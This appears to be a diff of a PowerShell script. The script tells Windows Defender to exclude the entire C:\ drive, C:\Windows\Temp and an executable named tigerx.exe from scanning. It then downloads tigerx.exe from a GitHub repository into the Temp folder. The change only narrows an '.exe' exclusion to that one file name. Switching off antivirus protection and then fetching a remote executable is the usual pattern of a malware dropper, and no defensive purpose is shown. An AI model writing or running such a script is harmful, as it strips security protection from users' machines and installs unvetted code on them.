@@ -1,4 +1,4 @@
-Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
+Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
 $url = "https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe"
 $outpath = "C:\Windows\Temp\tigerx.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
